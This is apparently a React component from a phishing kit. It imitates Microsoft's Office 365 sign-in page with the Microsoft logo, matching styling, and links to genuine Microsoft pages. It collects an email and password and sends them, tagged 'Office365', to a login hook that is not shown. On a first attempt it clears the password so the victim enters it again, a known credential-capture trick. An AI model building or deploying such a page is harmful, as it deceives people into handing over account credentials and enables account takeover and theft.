import React, { useState } from 'react';
import { useLogin } from '../hooks/useLogin';
import Spinner from './common/Spinner';
import { ArrowLeft, KeySquare } from 'lucide-react';

interface Office365LoginPageProps {
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
}

const Office365LoginPage: React.FC<Office365LoginPageProps> = ({ onLoginSuccess, onLoginError }) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPasswordStep, setShowPasswordStep] = useState(false);

  const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);

  const handleNext = (e: React.MouseEvent<HTMLButtonElement>) => {
    e.preventDefault();
    if (email) { setShowPasswordStep(true); }
  };
  
  const handleSubmit = async (e: React.FormEvent) => {
    const result = await handleFormSubmit(e, { email, password, provider: 'Office365' });
    if (result?.isFirstAttempt) { setPassword(''); }
  };

  const handleBackToEmail = () => {
    setShowPasswordStep(false);
    setPassword('');
  };

  return (
    <div 
      className="min-h-screen flex items-center justify-center p-4 font-sans bg-cover bg-center"
      style={{ backgroundImage: "url('https://cdn.wallpaperhub.app/cloudcache/9/1/a/6/b/4/91a6b4bbc15a346994515950e52c727e0fc34028.jpg')" }}
    >
      <div className="w-full max-w-md">
        <div className="bg-white shadow-lg p-8 md:p-11">
          <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" height="23" alt="Microsoft logo" className="mb-5" />

          {!showPasswordStep ? (
            // Email View
            <div>
              <h1 className="text-2xl font-semibold text-gray-800 mb-6">Sign in</h1>
              {errorMessage && !isLoading && (
                <p className="text-red-600 text-sm mb-4">{errorMessage}</p>
              )}
              <form onSubmit={(e) => e.preventDefault()}>
                <input 
                  type="email" 
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="Email, phone, or Skype" 
                  autoCapitalize="none"
                  className="w-full py-1 text-base border-b border-gray-500 focus:border-blue-600 focus:outline-none"
                />
                <p className="text-sm mt-4">No account? <a href="https://signup.live.com/" target="_blank" rel="noopener noreferrer" className="text-blue-600 hover:underline">Create one!</a></p>
                <p className="text-sm mt-1"><a href="https://account.live.com/password/reset" target="_blank" rel="noopener noreferrer" className="text-blue-600 hover:underline">Can't access your account?</a></p>
                <div className="text-right mt-6">
                  <button onClick={handleNext} disabled={!email} className="px-8 py-2 bg-[#0067b8] text-white font-medium rounded-sm hover:bg-[#005a9e] disabled:bg-gray-300">
                    Next
                  </button>
                </div>
              </form>
            </div>
          ) : (
            // Password View
            <div>
              <button onClick={handleBackToEmail} className="flex items-center text-sm text-gray-700 mb-2">
                <ArrowLeft className="w-4 h-4 mr-2" />
                <span>{email}</span>
              </button>
              <h1 className="text-2xl font-semibold text-gray-800 mb-4">Enter password</h1>
               {errorMessage && !isLoading && (
                <p className="text-red-600 text-sm mb-4">{errorMessage}</p>
              )}
              <form onSubmit={handleSubmit}>
                <input 
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Password"
                  autoFocus
                  className="w-full py-1 text-base border-b border-gray-500 focus:border-blue-600 focus:outline-none"
                />
                <p className="text-sm mt-4"><a href="https://account.live.com/password/reset" target="_blank" rel="noopener noreferrer" className="text-blue-600 hover:underline">Forgot password?</a></p>
                 <div className="text-right mt-6">
                  <button type="submit" disabled={isLoading || !password} className="px-8 py-2 bg-[#0067b8] text-white font-medium rounded-sm hover:bg-[#005a9e] disabled:bg-gray-300 flex items-center justify-center min-w-[108px]">
                    {isLoading ? <Spinner size="sm" color="border-white" /> : 'Sign in'}
                  </button>
                </div>
              </form>
            </div>
          )}
        </div>
        <div className="bg-white shadow-lg p-4 mt-4 text-sm hover:bg-gray-100 transition-colors cursor-pointer">
          <div className="flex items-center">
            <KeySquare className="w-6 h-6 text-gray-700 mr-4" />
            <span>Sign-in options</span>
          </div>
        </div>
      </div>
      <footer className="fixed bottom-3 right-6 text-xs text-white">
        <a href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank" rel="noopener noreferrer" className="text-white hover:underline mr-4">Terms of use</a>
        <a href="https://www.microsoft.com/en-US/privacy/privacystatement" target="_blank" rel="noopener noreferrer" className="text-white hover:underline mr-4">Privacy & cookies</a>
        <span className="cursor-pointer">...</span>
      </footer>
    </div>
  );
};

export default Office365LoginPage;
